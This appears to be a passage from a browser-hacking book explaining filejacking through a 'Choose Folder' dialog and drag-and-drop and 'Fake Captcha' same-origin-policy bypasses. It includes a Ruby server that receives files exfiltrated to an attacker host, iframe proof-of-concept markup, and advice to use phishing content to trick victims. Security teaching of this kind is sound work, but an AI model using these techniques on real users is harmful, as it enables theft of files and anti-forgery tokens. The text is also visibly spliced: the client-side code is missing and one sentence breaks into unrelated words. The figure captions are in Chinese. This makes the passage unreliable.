
The Filejacking attack relies on the target using the operating system’s “Choose Folder” dialog box when downloading a file from the web. To optimize the attack, you should attempt to trick the user into selecting a directory containing sensitive files, for instance by employing authentic-looking phishing content. [Figure 4-17](#c04.html#figure4-17) demonstrates what the target will see if they select the “Download to…” button. JavaScript will enumerate the files in the directory with the directory input attribute, and then POST each of the files back to your server.

 start figure 

[**Figure 4-17:**](#c04.html#figureanchor4-17) 点击“Download to…”会打开“选择文件夹”对话框。

![c04f017.tif](image_fi/662090c04/c04f017.png)

 end figure 

Consider the following server-side Ruby code:

```
require 'rubygems'
require 'thin'
require 'rack'
require 'sinatra'

class UploadManager < Sinatra::Base
  post "/" do
    puts "receiving post data"
    params.each do |key,value|
      puts "#{key}->#{value}"
    end
  end
end

@routes = {
    "/upload" => UploadManager.new
}

@rack_app = Rack::URLMap.new(@routes)
@thin = Thin::Server.new("browserhacker.com", 4000, @rack_app)

Thin::Logging.silent = true
Thin::Logging.debug = false

puts "[#{Time.now}] Thin ready"
@thin.start
```

The code is binding Thin, a Ruby web server, on port 4000 ready to process HTTP POST requests to the `/upload` URI. When a POST request arrives to that URI, the contents are printed on the console, as you can see in [Figure 4-18](#c04.html#figure4-18).

The following JavaScript code is the client-side part of the attack. Note the cloak button and the cloaked input elements have their opacity set to 0. These will then be covered by the visible button element. When the target clicks the button, they are actually clicking the input element, cannot be read, whereas other browsers such as Opera do not. You will explore how this behavior is significant with many types of new attacks in Chapters 9 and 10.

 start figure 

[**Figure 4-18:**](#c04.html#figureanchor4-18) POST data is sent cross-origin.

![c04f018.tif](image_fi/662090c04/c04f018.png)

 end figure 

### Using Drag and Drop

Another example of how inconsistent SOP implementations can result in vulnerabilities is the drag&drop UI redressing attack. Exploiting these holes in the target browser will result in stealing content across different origins. One of the first public disclosures of such an attack was from Michal Zalewski in late 2010.37 He reported a bug in Firefox (patched in 2012) where the SOP was not enforced when performing cross-origin drag&drop actions.

You could create an IFrame in a phishing page you control. The IFrame source points to a cross-origin resource, whose content can be read by bypassing the SOP if the user drags the IFrame and drops it somewhere in the top-level window.

This behavior can be achieved by tricking the target—for example, by displaying a basic game—to drag&drop elements in the page. The element that is dragged and dropped is the IFrame with the content you want to read.

The first PoC applying this technique used resources framed with view-source://. For example:

```
<iframe src="view-source:http://browservictim.com/any">
```

If a resource is loaded with view-source, the raw HTML source is rendered. There are numerous advantages to tricking the user into performing a drag&drop action of this framed content into the top-level window. These include the ability to read anti-XSRF tokens and any other information you can get reading the raw HTML of the page.

This bug was patched in late 2011 in Firefox, disallowing cross-origin drag&drop actions. Kotowicz found another interesting way around this limitation, which still worked in Firefox at the time of this writing. The technique is called “Fake Captcha”38 and covers a specific corner case. This issue occurs where a resource is framed using view-source as discussed before, and the content you want to retrieve is positioned with a specific offset on the top-level window. The technique is exploiting the fact that the user, when presented with an input field containing some content to be copied, may rely on a mouse triple-click and Ctrl+C. This action selects and copies the whole content to the clipboard. In this case, the content displayed in the input field is a fragment of a line of raw HTML from the framed content. [Figure 4-19](#c04.html#figure4-19) shows what the user sees, and [Figure 4-20](#c04.html#figure4-20) illustrates what’s really happening in the background.

 start figure 

[**Figure 4-19:**](#c04.html#figureanchor4-19) 用户可见的源代码。

![c04f019.tif](image_fi/662090c04/c04f019.png)

 end figure 

If the user triple-clicks with the mouse on the Security Code input field, it will effectively copy the whole line, as you can see in [Figure 4-20](#c04.html#figure4-20). The highlighted content is only a piece of the line, the section you want the unsuspecting user to see. The technique relies on positioning the IFrame at a specific offset on the top-level window. The Security Code input field is not a real input field, but an IFrame, as you can see from the following code:

```
<style>
iframe#one {
 margin: 0;
 padding: 0;
 width: 9em;
 height: 1em;
 border: 2px inset black;
 font: normal 13px/14px monospace;
 display: inline-block;
}
</style>

<p>
<label>Security code:</label><iframe id=one scrolling=no
src="http://browservictim.com/any"></iframe>
</p>
```

 start figure 

